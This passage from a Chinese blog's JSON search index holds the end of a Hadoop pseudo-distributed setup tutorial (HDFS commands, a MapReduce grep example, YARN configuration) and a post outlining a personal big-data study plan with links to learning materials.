&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x914D;&#x7F6E;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x4ED4;&#x7EC6;&#x68C0;&#x67E5;&#x4E4B;&#x524D;&#x6B65;&#x9AA4;&#xFF0C;&#x6216;&#x901A;&#x8FC7;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;&#x6392;&#x67E5;&#x539F;&#x56E0;&#x3002; 12345[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ jps20339 SecondaryNameNode20166 DataNode20027 NameNode15375 Jps &#x901A;&#x8FC7;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x542F;&#x52A8;&#x5931;&#x8D25;&#x539F;&#x56E0;&#x6709;&#x65F6; Hadoop &#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x542F;&#x52A8;&#xFF0C;&#x5982; NameNode &#x8FDB;&#x7A0B;&#x6CA1;&#x6709;&#x987A;&#x5229;&#x542F;&#x52A8;&#xFF0C;&#x8FD9;&#x65F6;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;&#x6765;&#x6392;&#x67E5;&#x539F;&#x56E0;&#xFF0C;&#x6CE8;&#x610F;&#x51E0;&#x70B9;&#xFF1A; &#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x63D0;&#x793A;&#x5F62;&#x5982; &#x201C;dblab: starting namenode, logging to /data/hadoop/logs/hadoop-hadoop-namenode-iZwz9b62gfdv0s2e67yo8kZ.out&#x201D;&#xFF0C;&#x5176;&#x4E2D; iZwz9b62gfdv0s2e67yo8kZ &#x5BF9;&#x5E94;&#x4F60;&#x7684;&#x4E3B;&#x673A;&#x540D;&#xFF0C;&#x4F46;&#x542F;&#x52A8;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x662F;&#x8BB0;&#x5F55;&#x5728; /data/hadoop/logs/hadoop-hadoop-namenode-iZwz9b62gfdv0s2e67yo8kZ.log &#x4E2D;&#xFF0C;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x540E;&#x7F00;&#x4E3A; .log &#x7684;&#x6587;&#x4EF6;&#xFF1B; &#x6BCF;&#x4E00;&#x6B21;&#x7684;&#x542F;&#x52A8;&#x65E5;&#x5FD7;&#x90FD;&#x662F;&#x8FFD;&#x52A0;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x6240;&#x4EE5;&#x5F97;&#x62C9;&#x5230;&#x6700;&#x540E;&#x9762;&#x770B;&#xFF0C;&#x770B;&#x4E0B;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#x3002; &#x4E00;&#x822C;&#x51FA;&#x9519;&#x7684;&#x63D0;&#x793A;&#x5728;&#x6700;&#x540E;&#x9762;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5199;&#x7740; Fatal&#x3001;Error &#x6216;&#x8005; Java Exception &#x7684;&#x5730;&#x65B9;&#x3002; &#x53EF;&#x4EE5;&#x5728;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x4E00;&#x4E0B;&#x51FA;&#x9519;&#x4FE1;&#x606F;&#xFF0C;&#x770B;&#x80FD;&#x5426;&#x627E;&#x5230;&#x4E00;&#x4E9B;&#x76F8;&#x5173;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x3002; &#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE; Web &#x754C;&#x9762; http://ip:50070 &#x67E5;&#x770B; NameNode &#x548C; Datanode &#x4FE1;&#x606F;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5728;&#x7EBF;&#x67E5;&#x770B; HDFS &#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x3002; &#x8FD0;&#x884C;hadoop&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x5B9E;&#x4F8B;&#x4E0A;&#x9762;&#x7684;&#x5355;&#x673A;&#x6A21;&#x5F0F;&#xFF0C;grep &#x4F8B;&#x5B50;&#x8BFB;&#x53D6;&#x7684;&#x662F;&#x672C;&#x5730;&#x6570;&#x636E;&#xFF0C;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x8BFB;&#x53D6;&#x7684;&#x5219;&#x662F; HDFS &#x4E0A;&#x7684;&#x6570;&#x636E;&#x3002;&#x8981;&#x4F7F;&#x7528; HDFS&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x5728; HDFS &#x4E2D;&#x521B;&#x5EFA;&#x7528;&#x6237;&#x76EE;&#x5F55;&#xFF1A; 1./bin/hdfs dfs -mkdir -p /user/hadoop &#x63A5;&#x7740;&#x5C06; ./etc/hadoop &#x4E2D;&#x7684; xml &#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5373;&#x5C06; /data/hadoop/etc/hadoop &#x590D;&#x5236;&#x5230;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684; /user/hadoop/input &#x4E2D;&#x3002;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x662F; hadoop &#x7528;&#x6237;&#xFF0C;&#x5E76;&#x4E14;&#x5DF2;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6237;&#x76EE;&#x5F55; /user/hadoop &#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x547D;&#x4EE4;&#x4E2D;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x5982; input&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x5C31;&#x662F; /user/hadoop/input: 12./bin/hdfs dfs -mkdir input./bin/hdfs dfs -put ./etc/hadoop/*.xml input &#x590D;&#x5236;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B; HDFS &#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5217;&#x8868;&#xFF1A;1./bin/hdfs dfs -ls input &#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x8FD0;&#x884C; MapReduce &#x4F5C;&#x4E1A;&#x7684;&#x65B9;&#x5F0F;&#x8DDF;&#x5355;&#x673A;&#x6A21;&#x5F0F;&#x76F8;&#x540C;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x8BFB;&#x53D6;&#x7684;&#x662F;HDFS&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x5355;&#x673A;&#x6B65;&#x9AA4;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x672C;&#x5730; input &#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x8F93;&#x51FA;&#x7ED3;&#x679C; output &#x6587;&#x4EF6;&#x5939;&#x90FD;&#x5220;&#x6389;&#x6765;&#x9A8C;&#x8BC1;&#x8FD9;&#x4E00;&#x70B9;&#xFF09;&#x3002; 12345678910./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar grep input output &apos;dfs[a-z.]+&apos;# &#x67E5;&#x770B;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x7684;&#x547D;&#x4EE4;&#xFF08;&#x67E5;&#x770B;&#x7684;&#x662F;&#x4F4D;&#x4E8E;HDFS&#x4E2D;&#x7684;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#xFF09;./bin/hdfs dfs -cat output/*# &#x7ED3;&#x679C;&#x5982;&#x4E0B;1 dfsadmin1 dfs.replication1 dfs.namenode.name.dir1 dfs.datanode.data.dir &#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x53D6;&#x56DE;&#x5230;&#x672C;&#x5730;&#xFF1A;123rm -r ./output # &#x5148;&#x5220;&#x9664;&#x672C;&#x5730;&#x7684; output &#x6587;&#x4EF6;&#x5939;&#xFF08;&#x5982;&#x679C;&#x5B58;&#x5728;&#xFF09;./bin/hdfs dfs -get output ./outputcat ./output/* &#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x65F6;&#xFF0C;&#x8F93;&#x51FA;&#x76EE;&#x5F55;&#x4E0D;&#x80FD;&#x5B58;&#x5728;&#x3002;&#x5728;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65F6;&#xFF0C;&#x53EF;&#x8003;&#x8651;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x52A0;&#x4E0A;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF0C;&#x80FD;&#x5728;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x65F6;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x8F93;&#x51FA;&#x76EE;&#x5F55;&#xFF0C;&#x907F;&#x514D;&#x7E41;&#x7410;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x64CD;&#x4F5C;.123456Configuration conf = new Configuration();Job job = new Job(conf); /* &#x5220;&#x9664;&#x8F93;&#x51FA;&#x76EE;&#x5F55; */Path outputPath = new Path(args[1]);outputPath.getFileSystem(conf).delete(outputPath, true); &#x82E5;&#x8981;&#x5173;&#x95ED; Hadoop&#xFF0C;&#x5219;&#x8FD0;&#x884C;1./sbin/stop-dfs.sh &#x4E0B;&#x6B21;&#x542F;&#x52A8; hadoop &#x65F6;&#xFF0C;&#x65E0;&#x9700;&#x8FDB;&#x884C; NameNode &#x7684;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x8FD0;&#x884C; ./sbin/start-dfs.sh &#x5373;&#x53EF; &#x542F;&#x52A8;YARN&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x4E0D;&#x542F;&#x52A8; YARN &#x4E5F;&#x53EF;&#x4EE5;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x3002; &#x6709;&#x7684;&#x4EBA;&#x53EF;&#x80FD;&#x4F1A;&#x7591;&#x60D1;&#xFF0C;&#x600E;&#x4E48;&#x542F;&#x52A8; Hadoop &#x540E;&#xFF0C;&#x89C1;&#x4E0D;&#x5230;&#x4E66;&#x4E0A;&#x6240;&#x8BF4;&#x7684; JobTracker &#x548C; TaskTracker&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;Hadoop2&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x7684; MapReduce &#x6846;&#x67B6;&#xFF08;MapReduce V2&#xFF0C;&#x4E5F;&#x79F0;&#x4E3A; YARN&#xFF0C;Yet Another Resource Negotiator&#xFF09;&#x3002; YARN &#x662F;&#x4ECE; MapReduce &#x4E2D;&#x5206;&#x79BB;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x8D1F;&#x8D23;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x4E0E;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x3002;YARN &#x8FD0;&#x884C;&#x4E8E; MapReduce &#x4E4B;&#x4E0A;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3001;&#x9AD8;&#x6269;&#x5C55;&#x6027;&#xFF0C;YARN &#x7684;&#x66F4;&#x591A;&#x4ECB;&#x7ECD;&#x5728;&#x6B64;&#x4E0D;&#x5C55;&#x5F00;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x79FB;&#x6B65;&#xFF1A;http://blog.chinaunix.net/uid-28311809-id-4383551.html &#x4E0A;&#x8FF0;&#x901A;&#x8FC7; ./sbin/start-dfs.sh &#x542F;&#x52A8; Hadoop&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x542F;&#x52A8;&#x4E86; MapReduce &#x73AF;&#x5883;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x542F;&#x52A8; YARN &#xFF0C;&#x8BA9; YARN &#x6765;&#x8D1F;&#x8D23;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x4E0E;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x3002; &#x9996;&#x5148;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6; mapred-site.xml&#xFF1A;123456789mv ./etc/hadoop/mapred-site.xml.template ./etc/hadoop/mapred-site.xmlvim ./etc/hadoop/mapred-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x542F;&#x52A8;YARN&#x4E86;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x5148;&#x6267;&#x884C;&#x8FC7; ./sbin/start-dfs.sh123./sbin/start-yarn.sh $ &#x542F;&#x52A8;YARN# &#x5F00;&#x542F;&#x5386;&#x53F2;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x624D;&#x80FD;&#x5728;Web&#x4E2D;&#x67E5;&#x770B;&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x60C5;&#x51B5;./sbin/mr-jobhistory-daemon.sh start historyserver &#x7136;&#x540E;&#x901A;&#x8FC7;jps&#x67E5;&#x770B;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x591A;&#x4E86; NodeManager &#x548C; ResourceManager &#x4E24;&#x4E2A;&#x540E;&#x53F0;&#x8FDB;&#x7A0B;&#x3002; &#x542F;&#x52A8; YARN &#x4E4B;&#x540E;&#xFF0C;&#x8FD0;&#x884C;&#x5B9E;&#x4F8B;&#x7684;&#x65B9;&#x6CD5;&#x8FD8;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x65B9;&#x5F0F;&#x3001;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x4E0D;&#x540C;&#x3002;&#x89C2;&#x5BDF;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x4E0D;&#x542F;&#x7528; YARN &#x65F6;&#xFF0C;&#x662F; &#x201C;mapred.LocalJobRunner&#x201D; &#x5728;&#x8DD1;&#x4EFB;&#x52A1;&#xFF0C;&#x542F;&#x7528; YARN &#x4E4B;&#x540E;&#xFF0C;&#x662F; &#x201C;mapred.YARNRunner&#x201D; &#x5728;&#x8DD1;&#x4EFB;&#x52A1;&#x3002;&#x542F;&#x52A8; YARN &#x6709;&#x4E2A;&#x597D;&#x5904;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; Web &#x754C;&#x9762;&#x67E5;&#x770B;&#x4EFB;&#x52A1;&#x7684;&#x8FD0;&#x884C;&#x60C5;&#x51B5;&#xFF1A;http://ip:8088/cluster &#x4F46; YARN &#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x96C6;&#x7FA4;&#x63D0;&#x4F9B;&#x66F4;&#x597D;&#x7684;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x4E0E;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#xFF0C;&#x7136;&#x800C;&#x8FD9;&#x5728;&#x5355;&#x673A;&#x4E0A;&#x4F53;&#x73B0;&#x4E0D;&#x51FA;&#x4EF7;&#x503C;&#xFF0C;&#x53CD;&#x800C;&#x4F1A;&#x4F7F;&#x7A0B;&#x5E8F;&#x8DD1;&#x5F97;&#x7A0D;&#x6162;&#x4E9B;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x5355;&#x673A;&#x4E0A;&#x662F;&#x5426;&#x5F00;&#x542F; YARN &#x5C31;&#x770B;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4E86;&#x3002; &#x4E0D;&#x542F;&#x52A8; YARN &#x9700;&#x91CD;&#x547D;&#x540D; mapred-site.xml&#x3002;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x542F;&#x52A8; YARN&#xFF0C;&#x52A1;&#x5FC5;&#x628A;&#x914D;&#x7F6E;&#x6587;&#x4EF6; mapred-site.xml &#x91CD;&#x547D;&#x540D;&#xFF0C;&#x6539;&#x6210; mapred-site.xml.template&#xFF0C;&#x9700;&#x8981;&#x7528;&#x65F6;&#x6539;&#x56DE;&#x6765;&#x5C31;&#x884C;&#x3002;&#x5426;&#x5219;&#x5728;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#xFF0C;&#x800C;&#x672A;&#x5F00;&#x542F; YARN &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x4F1A;&#x63D0;&#x793A; &#x201C;Retrying connect to server: 0.0.0.0/0.0.0.0:8032&#x201D; &#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E3A;&#x4F55;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x521D;&#x59CB;&#x6587;&#x4EF6;&#x540D;&#x4E3A; mapred-site.xml.template&#x3002; &#x94FE;&#x63A5;&#x76F8;&#x5173;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x8BA1;&#x5212;http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ hadoop2&#x4E0B;&#x8F7D;&#x5730;&#x5740;http://mirrors.hust.edu.cn/apache/hadoop/common/hadoop-2.7.2/ Yarn&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x53CA;&#x5185;&#x5B58;&#x914D;&#x7F6E;http://blog.chinaunix.net/uid-28311809-id-4383551.html hadoop&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;http://www.iyunv.com/thread-17698-1-1.html","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://www.wangxin123.com/tags/hadoop/"}]},{"title":"大数据进阶计划","slug":"大数据进阶计划","date":"2017-02-18T13:18:00.000Z","updated":"2017-02-26T07:36:56.626Z","comments":true,"path":"2017/02/18/大数据进阶计划/","link":"","permalink":"http://www.wangxin123.com/2017/02/18/大数据进阶计划/","excerpt":"&#x6700;&#x8FD1;&#x770B;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x91CC;&#x9762;&#x8BA4;&#x4E3A;&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4; &#x521D;&#x8BC6;Hadoop &#x66F4;&#x9AD8;&#x6548;&#x7684;WordCount &#x628A;&#x522B;&#x5904;&#x7684;&#x6570;&#x636E;&#x641E;&#x5230;Hadoop&#x4E0A; &#x628A;Hadoop&#x4E0A;&#x7684;&#x6570;&#x636E;&#x641E;&#x5230;&#x522B;&#x5904;&#x53BB; &#x5FEB;&#x4E00;&#x70B9;&#x5427;&#xFF0C;&#x6211;&#x7684;SQL &#x4E00;&#x592B;&#x591A;&#x59BB;&#x5236; &#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x7684;&#x5206;&#x6790;&#x4EFB;&#x52A1; &#x6211;&#x7684;&#x6570;&#x636E;&#x8981;&#x5B9E;&#x65F6; &#x6211;&#x7684;&#x6570;&#x636E;&#x8981;&#x5BF9;&#x5916; &#x725B;&#x903C;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x5B66;&#x4E60; 15&#x5E74;&#x66FE;&#x81EA;&#x5B66;&#x8D70;&#x5230;&#x7B2C;&#x516D;&#x6B65;&#xFF0C;&#x88C5;&#x4E86;&#x4E00;&#x5927;&#x63A8;&#x8F6F;&#x4EF6;&#xFF0C;&#x8DD1;&#x4E86;&#x4E00;&#x5806;&#x6570;&#x636E;&#x3002;&#x53EF;&#x60DC;&#x5F53;&#x65F6;&#x53EA;&#x4FDD;&#x5B58;&#x4E86;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#x548C;&#x4E00;&#x5806;&#x6742;&#x4E71;&#x65E0;&#x7AE0;&#x7684;&#x7B14;&#x8BB0;&#xFF0C;&#x6CA1;&#x6709;&#x6574;&#x7406;&#x6210;&#x811A;&#x672C;&#x548C;&#x6587;&#x7AE0;&#x3002;&#x73B0;&#x60F3;&#x6361;&#x56DE;&#x4EE5;&#x524D;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5E76;&#x8FDB;&#x9636;&#x5B66;&#x4E60;&#xFF0C;&#x53C8;&#x5F97;&#x4ECE;&#x5934;&#x5F00;&#x59CB;&#xFF0C;&#x6094;&#x4E0D;&#x5F53;&#x521D;&#x3002; &#x6574;&#x7406;&#x5F53;&#x521D;&#x7684;&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#xFF08;&#x89C6;&#x9891;&#x3001;ppt&#x3001;&#x4EE3;&#x7801;&#x548C;&#x5B89;&#x88C5;&#x5305;&#x7B49;&#xFF09;&#xFF0C;&#x94FE;&#x63A5;&#x5982;&#x4E0B;&#xFF08;&#x5BC6;&#x7801;&#x77ED;&#x671F;&#x4E4B;&#x5185;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#xFF09;: &#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8BBA;&#x575B;&#xFF1A;http://www.aboutyun.com/ &#x5434;&#x8D85;hadoop&#x89C6;&#x9891;&#x6559;&#x7A0B;&#x5168;&#x5957;&#xFF1A;http://pan.baidu.com/s/1kUQP3cN &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;a49u &#x70BC;&#x6570;&#x6210;&#x91D1;hadoop&#x89C6;&#x9891;&#xFF1A;http://pan.baidu.com/s/1i5Es83V &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;vnw7 &#x5927;&#x6570;&#x636E;&#x8D44;&#x6599;&#x96C6;&#x9526;&#xFF1A;http://pan.baidu.com/s/1c1AOI4K &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;ufgs &#x6700;&#x8FD1;&#x4E00;&#x4E2A;&#x6708;&#xFF0C;&#x4F1A;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#xFF0C;&#x5E76;&#x6309;&#x7167;&#x4E0B;&#x9762;&#x7684;&#x6280;&#x672F;&#x56FE;&#x8C31;&#xFF0C;&#x5F00;&#x59CB;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x4E4B;&#x65C5;&#x3002;&#x968F;&#x7740;&#x5B66;&#x4E60;&#x6DF1;&#x5165;&#xFF0C;&#x4F1A;&#x5C06;&#x65B0;&#x5199;&#x7684;&#x6587;&#x7AE0;&#x94FE;&#x63A5;&#x6C47;&#x5165;&#x56FE;&#x8C31;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9;&#x4E2D;&#x3002;&#x8111;&#x56FE;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/58a81160e4b0669d9957a433","keywords":null,"text":"&#x6700;&#x8FD1;&#x770B;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x91CC;&#x9762;&#x8BA4;&#x4E3A;&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4; &#x521D;&#x8BC6;Hadoop &#x66F4;&#x9AD8;&#x6548;&#x7684;WordCount &#x628A;&#x522B;&#x5904;&#x7684;&#x6570;&#x636E;&#x641E;&#x5230;Hadoop&#x4E0A; &#x628A;Hadoop&#x4E0A;&#x7684;&#x6570;&#x636E;&#x641E;&#x5230;&#x522B;&#x5904;&#x53BB; &#x5FEB;&#x4E00;&#x70B9;&#x5427;&#xFF0C;&#x6211;&#x7684;SQL &#x4E00;&#x592B;&#x591A;&#x59BB;&#x5236; &#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x7684;&#x5206;&#x6790;&#x4EFB;&#x52A1; &#x6211;&#x7684;&#x6570;&#x636E;&#x8981;&#x5B9E;&#x65F6; &#x6211;&#x7684;&#x6570;&#x636E;&#x8981;&#x5BF9;&#x5916; &#x725B;&#x903C;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x5B66;&#x4E60; 15&#x5E74;&#x66FE;&#x81EA;&#x5B66;&#x8D70;&#x5230;&#x7B2C;&#x516D;&#x6B65;&#xFF0C;&#x88C5;&#x4E86;&#x4E00;&#x5927;&#x63A8;&#x8F6F;&#x4EF6;&#xFF0C;&#x8DD1;&#x4E86;&#x4E00;&#x5806;&#x6570;&#x636E;&#x3002;&#x53EF;&#x60DC;&#x5F53;&#x65F6;&#x53EA;&#x4FDD;&#x5B58;&#x4E86;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#x548C;&#x4E00;&#x5806;&#x6742;&#x4E71;&#x65E0;&#x7AE0;&#x7684;&#x7B14;&#x8BB0;&#xFF0C;&#x6CA1;&#x6709;&#x6574;&#x7406;&#x6210;&#x811A;&#x672C;&#x548C;&#x6587;&#x7AE0;&#x3002;&#x73B0;&#x60F3;&#x6361;&#x56DE;&#x4EE5;&#x524D;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5E76;&#x8FDB;&#x9636;&#x5B66;&#x4E60;&#xFF0C;&#x53C8;&#x5F97;&#x4ECE;&#x5934;&#x5F00;&#x59CB;&#xFF0C;&#x6094;&#x4E0D;&#x5F53;&#x521D;&#x3002; &#x6574;&#x7406;&#x5F53;&#x521D;&#x7684;&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#xFF08;&#x89C6;&#x9891;&#x3001;ppt&#x3001;&#x4EE3;&#x7801;&#x548C;&#x5B89;&#x88C5;&#x5305;&#x7B49;&#xFF09;&#xFF0C;&#x94FE;&#x63A5;&#x5982;&#x4E0B;&#xFF08;&#x5BC6;&#x7801;&#x77ED;&#x671F;&#x4E4B;&#x5185;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#xFF09;: &#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8BBA;&#x575B;&#xFF1A;http://www.aboutyun.com/ &#x5434;&#x8D85;hadoop&#x89C6;&#x9891;&#x6559;&#x7A0B;&#x5168;&#x5957;&#xFF1A;http://pan.baidu.com/s/1kUQP3cN &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;a49u &#x70BC;&#x6570;&#x6210;&#x91D1;hadoop&#x89C6;&#x9891;&#xFF1A;http://pan.baidu.com/s/1i5Es83V &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;vnw7 &#x5927;&#x6570;&#x636E;&#x8D44;&#x6599;&#x96C6;&#x9526;&#xFF1A;http://pan.baidu.com/s/1c1AOI4K &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;ufgs &#x6700;&#x8FD1;&#x4E00;&#x4E2A;&#x6708;&#xFF0C;&#x4F1A;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x5B66;&#x4E60;&#x8D44;&#x6599;&#xFF0C;&#x5E76;&#x6309;&#x7167;&#x4E0B;&#x9762;&#x7684;&#x6280;&#x672F;&#x56FE;&#x8C31;&#xFF0C;&#x5F00;&#x59CB;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x4E4B;&#x65C5;&#x3002;&#x968F;&#x7740;&#x5B66;&#x4E60;&#x6DF1;&#x5165;&#xFF0C;&#x4F1A;&#x5C06;&#x65B0;&#x5199;&#x7684;&#x6587;&#x7AE0;&#x94FE;&#x63A5;&#x6C47;&#x5165;&#x56FE;&#x8C31;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9;&#x4E2D;&#x3002;&#x8111;&#x56FE;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/58a81160e4b0669d9957a433","raw":null,"content":null,"categories":[{"name":"思维导图","slug":"思维导图","permalink":"http://www.wangxin123.com/categories/思维导图/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/tags/大数据/"}]},{"title":"大型网站技术架构梳理","slug":"大型网站技